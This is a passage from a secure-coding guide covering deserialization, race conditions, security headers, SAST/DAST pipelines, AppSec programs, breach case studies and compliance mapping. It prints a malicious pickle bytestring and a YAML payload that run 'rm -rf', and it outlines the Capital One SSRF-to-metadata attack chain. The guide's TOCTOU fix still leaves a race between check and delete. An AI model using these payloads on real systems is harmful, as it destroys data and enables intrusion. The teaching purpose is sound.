### Python Pickle

Pickle can execute arbitrary code during deserialization.

```python
# ❌ Never unpickle untrusted data
import pickle

# Attacker crafts malicious pickle
malicious_pickle = b'\x80\x03cposix\nsystem\nq\x00X\x06\x00\x00\x00rm -rfq\x01\x85q\x02Rq\x03.'

data = pickle.loads(malicious_pickle)  # Executes: rm -rf

# ✅ Use JSON for untrusted data
import json

safe_data = json.loads(untrusted_input)

# ✅ If you must use pickle, validate source
# Only pickle data you created
# Sign pickled data and verify signature before unpickling
import hmac

def safe_pickle_dumps(obj, key):
    pickled = pickle.dumps(obj)
    signature = hmac.new(key, pickled, 'sha256').digest()
    return signature + pickled

def safe_pickle_loads(data, key):
    signature = data[:32]
    pickled = data[32:]

    expected = hmac.new(key, pickled, 'sha256').digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")

    return pickle.loads(pickled)
```

### YAML Deserialization

YAML parsers can execute code.

```python
# ❌ Vulnerable YAML parsing
import yaml

data = yaml.load(user_input)  # Deprecated, unsafe

# Attacker sends:
# !!python/object/apply:os.system ['rm -rf /']

# ✅ Use safe loader
data = yaml.safe_load(user_input)  # Only loads basic types
```

## Race Conditions and TOCTOU

Time-Of-Check to Time-Of-Use vulnerabilities happen when state changes between verification and action.

### File System TOCTOU

```python
# ❌ TOCTOU vulnerability
import os

def safe_delete(filename):
    # Check if file exists
    if os.path.exists(filename):
        # Attacker creates symlink here: filename -> /etc/passwd
        os.remove(filename)  # Deletes /etc/passwd instead!

# ✅ Use atomic operations or file descriptors
import os

def safe_delete(filename):
    try:
        # Open file first (gets file descriptor)
        fd = os.open(filename, os.O_RDONLY)

        # Verify it's a regular file (not symlink)
        stat = os.fstat(fd)
        if not stat.S_ISREG(stat.st_mode):
            os.close(fd)
            raise ValueError("Not a regular file")

        os.close(fd)

        # Now safe to delete (verified it's not a symlink)
        os.remove(filename)

    except OSError:
        pass
```

### Database Race Conditions

```python
# ❌ Race condition in account transfer
def transfer(from_account, to_account, amount):
    # Check balance
    balance = db.query("SELECT balance FROM accounts WHERE id = ?", from_account)

    if balance >= amount:
        # Another thread withdraws here - double-spend possible
        db.execute("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, from_account)
        db.execute("UPDATE accounts SET balance = balance + ? WHERE id = ?", amount, to_account)

# ✅ Use database transactions with proper isolation
def transfer(from_account, to_account, amount):
    with db.transaction(isolation='SERIALIZABLE'):
        # Lock row
        balance = db.query(
            "SELECT balance FROM accounts WHERE id = ? FOR UPDATE",
            from_account
        )

        if balance < amount:
            raise ValueError("Insufficient funds")

        db.execute(
            "UPDATE accounts SET balance = balance - ? WHERE id = ?",
            amount, from_account
        )
        db.execute(
            "UPDATE accounts SET balance = balance + ? WHERE id = ?",
            amount, to_account
        )

# ✅ Or use atomic operations
db.execute("""
    UPDATE accounts
    SET balance = balance - ?
    WHERE id = ? AND balance >= ?
""", amount, from_account, amount)

if db.rowcount == 0:
    raise ValueError("Insufficient funds or account not found")
```

## Security Headers: The Complete Suite

Comprehensive security headers configuration.

```python
# Flask example with all security headers
from flask import Flask

app = Flask(__name__)

@app.after_request
def set_security_headers(response):
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{nonce}'; "
        "style-src 'self' 'nonce-{nonce}'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "upgrade-insecure-requests"
    )

    # Strict Transport Security (HSTS)
    response.headers['Strict-Transport-Security'] = (
        "max-age=31536000; includeSubDomains; preload"
    )

    # Prevent MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'

    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'

    # XSS Protection (legacy, but doesn't hurt)
    response.headers['X-XSS-Protection'] = '1; mode=block'

    # Referrer Policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

    # Permissions Policy (formerly Feature-Policy)
    response.headers['Permissions-Policy'] = (
        "geolocation=(), "
        "microphone=(), "
        "camera=(), "
        "payment=(), "
        "usb=(), "
        "magnetometer=(), "
        "gyroscope=(), "
        "accelerometer=()"
    )

    # Cross-Origin policies
    response.headers['Cross-Origin-Embedder-Policy'] = 'require-corp'
    response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
    response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'

    # Remove server header
    response.headers.pop('Server', None)

    return response
```

**Testing security headers:**

```bash
# Use securityheaders.com or:
curl -I https://example.com | grep -i "security\|content-security\|frame-options"

# Or Mozilla Observatory
# https://observatory.mozilla.org/
```

## SAST/DAST Integration

Automated security testing in CI/CD pipeline.

### Static Analysis (SAST)

**Semgrep configuration:**

```yaml
# .semgrep.yml
rules:
  - id: sql-injection
    pattern: |
      $DB.query($QUERY + ...)
    message: Potential SQL injection - use parameterized queries
    severity: ERROR
    languages: [javascript, python, java]

  - id: hardcoded-secret
    pattern-either:
      - pattern: password = "..."
      - pattern: api_key = "..."
      - pattern: secret = "..."
    message: Hardcoded secret detected
    severity: ERROR
    languages: [javascript, python, java]

  - id: unsafe-deserialization
    pattern-either:
      - pattern: pickle.loads($INPUT)
      - pattern: yaml.load($INPUT)
    message: Unsafe deserialization
    severity: ERROR
    languages: [python]

  - id: command-injection
    pattern: |
      subprocess.run($CMD, shell=True)
    message: Command injection risk - avoid shell=True
    severity: WARNING
    languages: [python]
```

**GitHub Actions with Semgrep:**

```yaml
name: Security Scan

on: [push, pull_request]

jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
            .semgrep.yml

      - name: Upload SARIF results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: semgrep.sarif
        if: always()
```

### Dynamic Analysis (DAST)

**OWASP ZAP automation:**

```yaml
name: DAST Scan

on:
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM

jobs:
  zap_scan:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to staging
        run: |
          # Deploy application to staging environment

      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'  # Include alerts in report

      - name: Upload ZAP results
        uses: actions/upload-artifact@v3
        with:
          name: zap-report
          path: report_html.html
```

**ZAP rules configuration:**

```tsv
# .zap/rules.tsv
# Format: id  action  (IGNORE, WARN, or FAIL)
10021   FAIL    # X-Content-Type-Options header missing
10020   FAIL    # X-Frame-Options header missing
10096   FAIL    # Timestamp disclosure
10038   WARN    # Content Security Policy missing
10055   WARN    # CSP wildcard directive
```

## Application Security Programs

Building a sustainable AppSec program at scale.

### Security Champions Program

Distributed security expertise across development teams.

**Structure:**
- One security champion per team (rotating annually)
- Monthly training and knowledge sharing
- Direct line to security team
- Dedicated time (10-20% of sprint)

**Champion responsibilities:**
- Security code review
- Threat modeling facilitation
- Security testing advocacy
- Vulnerability triage
- Security awareness in team

**Implementation:**

```markdown
# Security Champion Playbook

## Monthly Activities
- [ ] Review security scan results (SAST, DAST, dependency)
- [ ] Attend security champions meeting
- [ ] Share security updates with team
- [ ] Conduct one security-focused code review

## Quarterly Activities
- [ ] Facilitate threat modeling session for new features
- [ ] Review and update team's security documentation
- [ ] Participate in security tabletop exercise

## Resources
- Security team Slack: #security-team
- On-call security engineer: security-oncall@example.com
- Security wiki: https://wiki.example.com/security
- Training: https://training.example.com/security
```

### Secure SDLC (S-SDLC)

Security integrated at every phase.

**Requirements Phase:**
- Security requirements identified
- Compliance requirements documented
- Privacy requirements specified

**Design Phase:**
- Threat modeling completed
- Security architecture reviewed
- Data flow diagrams created

**Development Phase:**
- SAST scans on every commit
- Security-focused code review
- Dependency scanning

**Testing Phase:**
- DAST scans on staging
- Penetration testing (quarterly or for major releases)
- Security test cases

**Deployment Phase:**
- Infrastructure security review
- Secrets management verification
- Security configuration validated

**Operations Phase:**
- Security monitoring active
- Incident response plan tested
- Vulnerability management process

**Metrics dashboard:**

```python
# Security metrics tracking
class SecurityMetrics:
    def __init__(self, db):
        self.db = db

    def vulnerability_density(self, timeframe='30d'):
        """Vulnerabilities per 1000 lines of code"""
        vulns = self.db.query(
            "SELECT COUNT(*) FROM vulnerabilities WHERE created_at > ?",
            timeframe
        )
        loc = self.db.query("SELECT SUM(lines) FROM repositories")

        return (vulns / loc) * 1000

    def mean_time_to_remediate(self, severity='critical'):
        """Average time from discovery to fix"""
        vulns = self.db.query("""
            SELECT AVG(DATEDIFF(resolved_at, created_at))
            FROM vulnerabilities
            WHERE severity = ? AND resolved_at IS NOT NULL
        """, severity)

        return vulns

    def security_test_coverage(self):
        """Percentage of code covered by security tests"""
        return self.db.query("""
            SELECT (security_test_lines / total_lines) * 100
            FROM code_coverage
        """)

    def false_positive_rate(self, tool):
        """Percentage of findings that are false positives"""
        total = self.db.query(
            "SELECT COUNT(*) FROM findings WHERE tool = ?", tool
        )
        false_positives = self.db.query(
            "SELECT COUNT(*) FROM findings WHERE tool = ? AND false_positive = 1",
            tool
        )

        return (false_positives / total) * 100 if total > 0 else 0
```

### Bug Bounty Programs

Crowdsourced security testing.

**Program structure:**

```yaml
# Bug bounty program policy
scope:
  in_scope:
    - "*.example.com"
    - "api.example.com"
    - "admin.example.com"
  out_of_scope:
    - "*.staging.example.com"  # Test environments
    - "third-party services"

rewards:
  critical:  # RCE, authentication bypass, PII exposure
    minimum: $5,000
    maximum: $25,000
  high:      # IDOR, SQL injection, XSS in sensitive context
    minimum: $1,000
    maximum: $5,000
  medium:    # CSRF, XSS in low-sensitivity areas
    minimum: $250
    maximum: $1,000
  low:       # Security headers, information disclosure
    minimum: $50
    maximum: $250

rules:
  - No automated scanning without permission
  - No DoS attacks
  - No social engineering
  - No physical security testing
  - Report within 24 hours of discovery
  - No public disclosure before fix

safe_harbor:
  - We will not pursue legal action for good-faith security research
  - We will acknowledge researchers (with permission)
```

**Triage process:**

```python
class BugBountyTriage:
    def triage_submission(self, submission):
        """Triage bug bounty submission"""

        # Step 1: Initial validation
        if not self.is_in_scope(submission.target):
            return self.reject("Out of scope")

        if self.is_duplicate(submission):
            return self.reject("Duplicate")

        # Step 2: Severity assessment
        severity = self.assess_severity(submission)

        # Step 3: Reproduction
        if not self.reproduce(submission):
            return self.request_more_info()

        # Step 4: Impact analysis
        impact = self.analyze_impact(submission)

        # Step 5: Reward calculation
        reward = self.calculate_reward(severity, impact)

        # Step 6: Create ticket for remediation
        ticket = self.create_security_ticket(
            title=submission.title,
            severity=severity,
            impact=impact,
            steps_to_reproduce=submission.steps
        )

        # Step 7: Respond to researcher
        self.respond_to_researcher(
            submission=submission,
            status='triaged',
            reward=reward,
            ticket_id=ticket.id
        )

        return {
            'status': 'accepted',
            'severity': severity,
            'reward': reward
        }
```

## Real-World Case Studies

Learning from major breaches.

### Equifax (2017)

**What happened:** Breach of 147 million records due to unpatched Apache Struts vulnerability.

**Root cause:**
- Known CVE (CVE-2017-5638) with available patch
- One server missed the patch
- Vulnerability allowed remote code execution

**Lessons:**
1. **Patch management is critical**: Automated scanning for outdated components
2. **Defense in depth failed**: Network segmentation could have limited blast radius
3. **Monitoring failed**: Breach undetected for 76 days
4. **Certificate validation skipped**: Security tools misconfigured

**Prevention:**
```yaml
# Automated patch management
- Dependency scanning on every commit
- Automated security updates for critical CVEs
- Regular infrastructure scanning (weekly)
- Network segmentation (isolate sensitive data)
- Real-time monitoring with alerting
```

### Capital One (2019)

**What happened:** 100 million customer records exposed via SSRF vulnerability leading to AWS metadata access.

**Root cause:**
- Web application firewall (WAF) misconfiguration
- SSRF vulnerability allowed access to AWS metadata endpoint
- Over-privileged IAM role granted access to S3 buckets

**Attack chain:**
1. Exploited SSRF to access `http://169.254.169.254/latest/meta-data/`
2. Retrieved temporary AWS credentials from metadata service
3. Used credentials to list and download S3 buckets
4. Exfiltrated data over several months

**Lessons:**
1. **Defense in depth**: SSRF vulnerability + IAM misconfiguration + monitoring gaps
2. **Least privilege**: IAM role had excessive S3 permissions
3. **IMDSv2**: Require token for metadata access (prevents SSRF)
4. **Data access monitoring**: Unusual S3 access patterns should alert

**Prevention:**
```python
# SSRF prevention + AWS IMDSv2
def is_safe_url(url):
    parsed = urlparse(url)

    # Block metadata endpoint
    if parsed.hostname in ['169.254.169.254', 'metadata.google.internal']:
        return False

    # Block private IPs
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        if ip.is_private or ip.is_loopback:
            return False
    except Exception:
        return False

    return True

# IAM role with minimal permissions
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": ["s3:GetObject"],
            "Resource": ["arn:aws:s3:::specific-bucket/specific-prefix/*"]
        }
    ]
}

# Require IMDSv2 on EC2 instances
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

### SolarWinds (2020)

**What happened:** Supply chain attack compromised SolarWinds Orion software updates, affecting thousands of organizations.

**Attack:**
- Attackers compromised build system
- Injected malicious code (SUNBURST backdoor) into legitimate software updates
- Digitally signed with valid certificate
- Distributed to 18,000+ customers

**Lessons:**
1. **Build pipeline security**: Compromise of build system catastrophic
2. **Code signing**: Valid signature doesn't guarantee safety
3. **Supply chain risk**: Trust every dependency explicitly
4. **Monitoring**: Unusual outbound connections should alert

**Prevention:**
```yaml
# Secure build pipeline
build_security:
  - Isolated build environment (no network access)
  - Code review for all changes (including CI/CD)
  - Build reproducibility (verify builds match source)
  - Artifact signing and verification
  - Dependency pinning and verification
  - SBOM (Software Bill of Materials) generation
  - Runtime monitoring for unexpected behavior

# GitHub Actions example
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write

    steps:
      - uses: actions/checkout@v3

      # Verify commit signatures
      - name: Verify commits
        run: git verify-commit HEAD

      # Pin all actions by SHA (not tag)
      - uses: actions/setup-node@64ed1c7eab4cce3362f8c340dee64e5eaeef8f7c  # v3.6.0

      # Verify dependencies
      - name: Verify checksums
        run: npm audit signatures

      # Build in isolated environment
      - name: Build
        run: npm run build

      # Sign artifacts
      - uses: sigstore/cosign-installer@main
      - name: Sign
        run: cosign sign-blob --key cosign.key dist/app.js

      # Generate SBOM
      - uses: anchore/sbom-action@main
        with:
          path: dist/
          format: spdx-json
```

## Secure Coding Maturity Model

Assess and improve security practices over time.

### Level 1: Ad-Hoc
- Security is reactive (fix after breach)
- No security testing
- No security training
- No secure coding standards

### Level 2: Foundational
- Basic input validation
- Parameterized queries used
- Dependency scanning enabled
- Security included in code review

### Level 3: Structured
- SAST integrated in CI/CD
- Security requirements for all features
- Regular security training
- Threat modeling for major features
- Incident response plan exists

### Level 4: Proactive
- DAST automated
- Security champions program
- Bug bounty program
- Regular penetration testing
- Security metrics tracked
- S-SDLC implemented

### Level 5: Optimizing
- Continuous security improvement
- Security metrics drive decisions
- Advanced threat detection
- Zero Trust architecture
- Automated remediation where possible
- Security culture embedded

**Progression roadmap:**

```markdown
# Year 1: Foundational (Level 1 → 2)
Q1: Implement SAST scanning, dependency scanning
Q2: Security training for all developers
Q3: Establish secure coding standards
Q4: Security code review process

# Year 2: Structured (Level 2 → 3)
Q1: Threat modeling for new features
Q2: DAST implementation
Q3: Security champions program launch
Q4: Penetration testing cadence established

# Year 3: Proactive (Level 3 → 4)
Q1: Bug bounty program launch
Q2: Advanced security monitoring
Q3: Security metrics dashboard
Q4: S-SDLC fully implemented

# Year 4: Optimizing (Level 4 → 5)
Q1: Automated remediation workflows
Q2: Zero Trust implementation
Q3: Security culture assessment
Q4: Continuous optimization
```

## Compliance Mapping

Map secure coding practices to compliance requirements.

### PCI-DSS Requirements

**Requirement 6: Develop and maintain secure systems and applications**

| PCI-DSS | Secure Coding Practice |
|---------|------------------------|
| 6.2.4 | Public-facing web apps protected against known attacks (OWASP Top 10) |
| 6.3.1 | Removal of test accounts, credentials before production |
| 6.3.2 | Review custom code prior to release |
| 6.4.3 | Production data not used for testing |
| 6.5.1 | Injection flaws (SQL injection) |
| 6.5.7 | Cross-site scripting (XSS) |
| 6.5.9 | Improper access control |
| 6.5.10 | Broken authentication and session management |

### HIPAA Technical Safeguards

**§164.312 Technical safeguards**

| HIPAA | Secure Coding Practice |
|-------|------------------------|
| (a)(1) Access Control | Authentication and authorization in code |
| (b) Audit Controls | Security event logging |
| (c)(1) Integrity | Data integrity verification, checksums |
| (d) Transmission Security | TLS for data in transit |
| (e)(1) Encryption | Encryption at rest and in transit |

### GDPR Data Protection by Design

**Article 25: Data protection by design and by default**

| GDPR Principle | Secure Coding Practice |
|----------------|------------------------|
| Data minimization | Only collect and store necessary data |
| Purpose limitation | Access control based on purpose |
| Accuracy | Input validation, data integrity checks |
| Storage limitation | Automated data retention/deletion |
| Integrity and confidentiality | Encryption, access control |
| Pseudonymization | PII tokenization where possible |

### SOC 2 Control Mapping

**CC6: Logical and Physical Access Controls**

```python
# CC6.1: Access control enforcement
@require_authentication
@require_authorization(['admin'])
def sensitive_operation():
    # Logging (CC7.2)
    audit_log(
        user=current_user.id,
        action='sensitive_operation',
        timestamp=datetime.now()
    )

    # Encryption (CC6.7)
    sensitive_data = encrypt(data, key)

    return result
```

## Conclusion

Secure coding is not a destination - it's a continuous journey. The threat landscape evolves, new vulnerabilities emerge, and attack techniques become more sophisticated.

**Key principles to remember:**
1. **Defense in depth**: Multiple layers of security
2. **Fail securely**: Deny by default, audit failures
3. **Least privilege**: Minimal permissions necessary
4. **Trust but verify**: Validate even "trusted" input
5. **Security is everyone's job**: Not just the security team

**Continuous improvement:**
- Stay current with OWASP Top 10
- Monitor security advisories for your stack
- Practice security in code review
- Learn from breaches (yours and others')
- Measure and improve security metrics

The difference between a secure application and a breached one often comes down to consistent application of fundamental principles. Master the basics, apply them relentlessly, and build security into your development culture.


---

## Navigation

### Depth Levels
- **[← Surface](../surface/index.md)** Essential concepts and quick wins
- **[← Mid-Depth](../mid-depth/index.md)** Practical patterns and implementation details

### Related Topics
- [code-quality](../../code-quality/deep-water/index.md) - Related development considerations
- [secret-management](../../secret-management/deep-water/index.md) - Related development considerations
- [supply-chain-security](../../supply-chain-security/deep-water/index.md) - Related development considerations

### Navigate
- [← Back to Development Phase](../../index.md)
- [↑ Back to Main Guide](../../../../README.md)
